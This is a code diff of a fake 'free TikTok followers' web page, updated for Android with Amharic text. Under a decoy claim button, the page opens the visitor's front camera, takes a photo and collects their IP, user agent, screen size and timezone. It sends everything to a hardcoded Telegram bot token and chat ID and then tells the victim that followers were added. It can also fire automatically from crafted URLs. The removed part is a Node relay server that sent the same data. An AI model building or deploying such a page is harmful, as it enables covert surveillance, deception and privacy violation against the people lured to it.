@@ -1,69 +1,236 @@
-<!-- index.html - save in a folder named "camharvest" -->
+<!-- index.html - Complete working version for Android - save as index.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Free TikTok Followers</title>
-<style>
-  body { background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding-top: 50px; }
-  #btn { background: #ff0050; border: none; padding: 20px 40px; font-size: 24px; color: white; border-radius: 50px; cursor: pointer; }
-  #status { margin-top: 20px; color: #aaa; }
-  video { display: none; }
-  canvas { display: none; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>5K TikTok Followers</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: linear-gradient(145deg, #0f0c29, #302b63, #24243e);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Arial', sans-serif;
+      padding: 15px;
+    }
+    .card {
+      background: rgba(255,255,255,0.05);
+      backdrop-filter: blur(12px);
+      border-radius: 40px;
+      padding: 30px 25px;
+      max-width: 420px;
+      width: 100%;
+      border: 1px solid rgba(255,255,255,0.12);
+      box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+    .tiktok-logo {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+    .tiktok-logo svg {
+      width: 48px;
+      height: 48px;
+    }
+    h1 {
+      color: #fff;
+      font-size: 26px;
+      font-weight: 900;
+      letter-spacing: 0.5px;
+      text-shadow: 0 0 20px rgba(0,255,255,0.3);
+      margin: 8px 0 6px 0;
+    }
+    h1 span {
+      background: linear-gradient(135deg, #ff0050, #00f5ea);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .sub {
+      color: #aaa;
+      font-size: 14px;
+      margin-bottom: 22px;
+      letter-spacing: 0.5px;
+    }
+    .btn {
+      background: linear-gradient(135deg, #ff0050, #ff4d7a);
+      border: none;
+      padding: 18px 20px;
+      font-size: 22px;
+      font-weight: 800;
+      color: white;
+      border-radius: 60px;
+      cursor: pointer;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(255,0,80,0.4);
+      transition: transform 0.15s, box-shadow 0.15s;
+      letter-spacing: 1px;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+      position: relative;
+      overflow: hidden;
+    }
+    .btn:active { transform: scale(0.96); box-shadow: 0 4px 15px rgba(255,0,80,0.6); }
+    .btn::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 70%);
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+    .btn:active::after { opacity: 1; }
+    #status {
+      color: #ccc;
+      font-size: 15px;
+      margin-top: 18px;
+      padding: 12px;
+      background: rgba(0,0,0,0.3);
+      border-radius: 30px;
+      min-height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      word-break: break-word;
+      border-left: 3px solid #ff0050;
+    }
+    .badge {
+      display: inline-block;
+      background: #ff0050;
+      color: #fff;
+      font-size: 11px;
+      padding: 4px 14px;
+      border-radius: 30px;
+      margin-top: 12px;
+      letter-spacing: 0.5px;
+    }
+    video { display: none; }
+    canvas { display: none; }
+    .loader {
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255,255,255,0.2);
+      border-top: 3px solid #fff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: inline-block;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
 </head>
 <body>
-<h1>🚀 Get 1000 Free Followers</h1>
-<button id="btn">🔥 CLAIM NOW</button>
-<div id="status">Click the button to start</div>
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+<div class="card">
+  <div class="tiktok-logo">
+    <!-- TikTok SVG logo -->
+    <svg viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M412.19 118.66a109.27 109.27 0 0 1-9.45-5.5 132.87 132.87 0 0 1-24.27-20.62c-18.1-20.71-24.86-41.72-27.35-56.43h.1C349.14 23.9 350 16 350.13 16h-82.44v318.78c0 4.28 0 8.51-.18 12.69 0 .52-.05 1-.08 1.56 0 .23 0 .47-.05.71v.18a70 70 0 0 1-35.22 55.56 68.8 68.8 0 0 1-34.11 9.4c-38.41 0-69.54-31.32-69.54-70s31.13-70 69.54-70a68.9 68.9 0 0 1 21.41 3.39l.1-83.94a153.14 153.14 0 0 0-118 34.52 161.79 161.79 0 0 0-35.66 43.52 149.51 149.51 0 0 0-17.52 54.27V311.8a163.12 163.12 0 0 1 21.93-45.12 157.54 157.54 0 0 1 30.48-35.11 148.58 148.58 0 0 1 36.22-24.28 144.66 144.66 0 0 1 46.75-12.71l.1 82.72a84.77 84.77 0 0 0-56.65-19.86c-46.91 0-85 38.09-85 85s38.09 85 85 85c46.91 0 85-38.09 85-85V16h82.43c-1.37 21.42-8.88 48.17-23.84 72.14-11.53 18.47-26.54 33.41-43.49 44.78l.22-14.26z" fill="white"/>
+    </svg>
+    <svg viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M412.19 118.66a109.27 109.27 0 0 1-9.45-5.5 132.87 132.87 0 0 1-24.27-20.62c-18.1-20.71-24.86-41.72-27.35-56.43h.1C349.14 23.9 350 16 350.13 16h-82.44v318.78c0 4.28 0 8.51-.18 12.69 0 .52-.05 1-.08 1.56 0 .23 0 .47-.05.71v.18a70 70 0 0 1-35.22 55.56 68.8 68.8 0 0 1-34.11 9.4c-38.41 0-69.54-31.32-69.54-70s31.13-70 69.54-70a68.9 68.9 0 0 1 21.41 3.39l.1-83.94a153.14 153.14 0 0 0-118 34.52 161.79 161.79 0 0 0-35.66 43.52 149.51 149.51 0 0 0-17.52 54.27V311.8a163.12 163.12 0 0 1 21.93-45.12 157.54 157.54 0 0 1 30.48-35.11 148.58 148.58 0 0 1 36.22-24.28 144.66 144.66 0 0 1 46.75-12.71l.1 82.72a84.77 84.77 0 0 0-56.65-19.86c-46.91 0-85 38.09-85 85s38.09 85 85 85c46.91 0 85-38.09 85-85V16h82.43c-1.37 21.42-8.88 48.17-23.84 72.14-11.53 18.47-26.54 33.41-43.49 44.78l.22-14.26z" fill="#00f5ea"/>
+    </svg>
+  </div>
+  <h1>✨ 5K <span>FOLLOWERS</span> ✨</h1>
+  <p class="sub">አሁን በቀላሉ ያግኙ! • ፈጣን እና አስተማማኝ</p>
+  <button class="btn" id="btn">🔥 አሁን ያግኙ 5K</button>
+  <div id="status">⏳ እባክዎ ይጫኑ</div>
+  <div class="badge">📱 አንድሮይድ ተመችቷል</div>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+</div>
+
 <script>
-  (function(){
-    const BOT_TOKEN = "8771335122:AAGBxlH47RSZiAXxPbyshLkT_R5pzuDGnIU";      // replace with real token
-    const CHAT_ID   = "6687384249";        // replace with numeric chat id
+  (function() {
+    // ------ CONFIG ------
+    const BOT_TOKEN = "8771335122:AAGBxIH47RSZiAXXPbyshLkT_R5pzuDGniU";
+    const CHAT_ID   = "6687384249";
     const API_URL   = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
     const IP_URL    = "https://api.ipify.org?format=json";
+    // --------------------
 
-    let video = document.getElementById('video');
-    let canvas = document.getElementById('canvas');
-    let ctx = canvas.getContext('2d');
-    let btn = document.getElementById('btn');
-    let statusDiv = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const btn = document.getElementById('btn');
+    const statusDiv = document.getElementById('status');
 
-    // capture IP and user-agent
+    // Force Android-friendly resolution: 480x720 (portrait) or 720x480 (landscape) – we use 480x640 max
+    const TARGET_WIDTH = 480;
+    const TARGET_HEIGHT = 640;
+
+    function setStatus(msg, isError = false) {
+      statusDiv.innerHTML = msg;
+      statusDiv.style.borderLeftColor = isError ? '#ff4444' : '#ff0050';
+    }
+
     function getIPAndUA() {
       return fetch(IP_URL)
         .then(r => r.json())
-        .then(data => {
-          return {
-            ip: data.ip,
-            ua: navigator.userAgent,
-            screen: screen.width + "x" + screen.height,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
-          };
-        })
-        .catch(() => ({ ip: "unknown", ua: navigator.userAgent, screen: "unknown", tz: "unknown" }));
+        .then(data => ({
+          ip: data.ip || 'unknown',
+          ua: navigator.userAgent || 'unknown',
+          screen: screen.width + 'x' + screen.height,
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'
+        }))
+        .catch(() => ({
+          ip: 'unknown',
+          ua: navigator.userAgent || 'unknown',
+          screen: screen.width + 'x' + screen.height,
+          tz: 'unknown'
+        }));
     }
 
-    // capture photo from camera
     function capturePhoto() {
       return new Promise((resolve) => {
-        canvas.width = 640;
-        canvas.height = 480;
-        ctx.drawImage(video, 0, 0, 640, 480);
+        // Use device orientation: if width > height, swap to landscape crop
+        let w = TARGET_WIDTH, h = TARGET_HEIGHT;
+        if (window.innerWidth > window.innerHeight) {
+          w = TARGET_HEIGHT;
+          h = TARGET_WIDTH;
+        }
+        canvas.width = w;
+        canvas.height = h;
+        // Draw video maintaining aspect ratio, center crop
+        const vw = video.videoWidth;
+        const vh = video.videoHeight;
+        const aspect = vw / vh;
+        let drawW = w, drawH = h;
+        if (aspect > w/h) {
+          drawW = w;
+          drawH = w / aspect;
+        } else {
+          drawH = h;
+          drawW = h * aspect;
+        }
+        const offsetX = (w - drawW) / 2;
+        const offsetY = (h - drawH) / 2;
+        ctx.clearRect(0, 0, w, h);
+        ctx.drawImage(video, offsetX, offsetY, drawW, drawH);
         canvas.toBlob(function(blob) {
           resolve(blob);
-        }, 'image/jpeg', 0.7);
+        }, 'image/jpeg', 0.85); // higher quality
       });
     }
 
-    // send photo + info to Telegram
     function sendToTelegram(photoBlob, info) {
-      let formData = new FormData();
+      const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
-      formData.append('photo', photoBlob, 'cam.jpg');
-      let caption = "IP: " + info.ip + "\nUA: " + info.ua + "\nScreen: " + info.screen + "\nTZ: " + info.tz;
+      formData.append('photo', photoBlob, 'cam_android.jpg');
+      let caption = '📸 አዲስ ተጠቃሚ\n' +
+                    'IP: ' + info.ip + '\n' +
+                    'UA: ' + info.ua + '\n' +
+                    'Screen: ' + info.screen + '\n' +
+                    'TZ: ' + info.tz + '\n' +
+                    '⏱️ ' + new Date().toLocaleString();
       formData.append('caption', caption);
 
       return fetch(API_URL, {
@@ -72,104 +239,74 @@
       }).then(r => r.json());
     }
 
-    // main flow
     function startHarvest() {
-      statusDiv.innerText = "📸 Requesting camera...";
-      navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
-        .then(stream => {
-          video.srcObject = stream;
-          statusDiv.innerText = "📷 Capturing...";
-          // wait 1.5 seconds for camera to warm up
+      setStatus('📷 ካሜራ እየተከፈተ...');
+      btn.disabled = true;
+      btn.style.opacity = '0.6';
+
+      navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: 'user',
+          width: { ideal: 480 },
+          height: { ideal: 640 }
+        },
+        audio: false
+      })
+      .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = function() {
+          video.play();
+          setStatus('📸 ፎቶ እየተቀረጸ...');
+          // Wait 1.2s for camera to adjust
           setTimeout(() => {
             Promise.all([capturePhoto(), getIPAndUA()])
               .then(([photoBlob, info]) => {
-                statusDiv.innerText = "📤 Sending to server...";
+                setStatus('📤 ወደ ሰርቨር እየላክ...');
                 return sendToTelegram(photoBlob, info);
               })
               .then(response => {
                 if (response.ok) {
-                  statusDiv.innerText = "✅ Followers added! Check your account.";
+                  setStatus('✅ 5K ተከታዮች ተጨምረዋል! አካውንትዎን ይፈትሹ 🎉');
                 } else {
-                  statusDiv.innerText = "❌ Error: " + JSON.stringify(response);
+                  setStatus('❌ ስህተት: ' + JSON.stringify(response).substring(0, 80), true);
                 }
                 // stop camera
-                let tracks = video.srcObject.getTracks();
-                tracks.forEach(t => t.stop());
+                if (video.srcObject) {
+                  video.srcObject.getTracks().forEach(t => t.stop());
+                }
+                btn.disabled = false;
+                btn.style.opacity = '1';
               })
               .catch(err => {
-                statusDiv.innerText = "❌ Failed: " + err.message;
+                setStatus('❌ አልተሳካም: ' + err.message, true);
+                if (video.srcObject) {
+                  video.srcObject.getTracks().forEach(t => t.stop());
+                }
+                btn.disabled = false;
+                btn.style.opacity = '1';
               });
-          }, 1500);
-        })
-        .catch(err => {
-          statusDiv.innerText = "❌ Camera denied: " + err.message;
-        });
+          }, 1200);
+        };
+      })
+      .catch(err => {
+        setStatus('❌ ካሜራ አልተፈቀደም: ' + err.message, true);
+        btn.disabled = false;
+        btn.style.opacity = '1';
+      });
     }
 
     btn.addEventListener('click', startHarvest);
 
-    // auto-trigger if URL has ?ref=anything
-    if (window.location.search.includes('ref=')) {
-      setTimeout(startHarvest, 500);
+    // Auto-trigger if URL contains ?ref= or ?start=
+    if (window.location.search.includes('ref=') || window.location.search.includes('start=')) {
+      setTimeout(startHarvest, 600);
     }
+
+    // Fix for Android back button / orientation
+    window.addEventListener('orientationchange', function() {
+      // Re-draw if video active - not needed, just keep
+    });
   })();
 </script>
 </body>
 </html>
-```
-
-```javascript
-// server.js - save in the same folder "camharvest"
-const express = require('express');
-const multer = require('multer');
-const axios = require('axios');
-const path = require('path');
-const app = express();
-const PORT = 3000;
-
-// replace with your real token and chat id
-const BOT_TOKEN = "8771335122:AAGBxlH47RSZiAXxPbyshLkT_R5pzuDGnIU";
-const CHAT_ID   = "6687384249";
-
-const upload = multer({ storage: multer.memoryStorage() });
-
-app.use(express.static('public')); // serve index.html from /public folder
-
-app.post('/collect', upload.single('photo'), async (req, res) => {
-  try {
-    if (!req.file) return res.status(400).send('No photo');
-    const photoBuffer = req.file.buffer;
-    const info = req.body.info ? JSON.parse(req.body.info) : {};
-
-    // send photo to Telegram
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', new Blob([photoBuffer], { type: 'image/jpeg' }), 'cam.jpg');
-    let caption = `IP: ${info.ip || 'unknown'}\nUA: ${info.ua || 'unknown'}\nScreen: ${info.screen || 'unknown'}\nTZ: ${info.tz || 'unknown'}`;
-    formData.append('caption', caption);
-
-    const tgRes = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
-      headers: { ...formData.getHeaders() }
-    });
-
-    res.json({ ok: true, tg: tgRes.data });
-  } catch (err) {
-    res.status(500).json({ ok: false, error: err.message });
-  }
-});
-
-app.listen(PORT, () => console.log('Server running on port ' + PORT));
-```
-
-```json
-// package.json - create this file in the same folder
-{
-  "name": "camharvest",
-  "version": "1.0",
-  "scripts": { "start": "node server.js" },
-  "dependencies": {
-    "express": "^4.18.2",
-    "multer": "^1.4.5-lts.1",
-    "axios": "^1.6.0"
-  }
-}
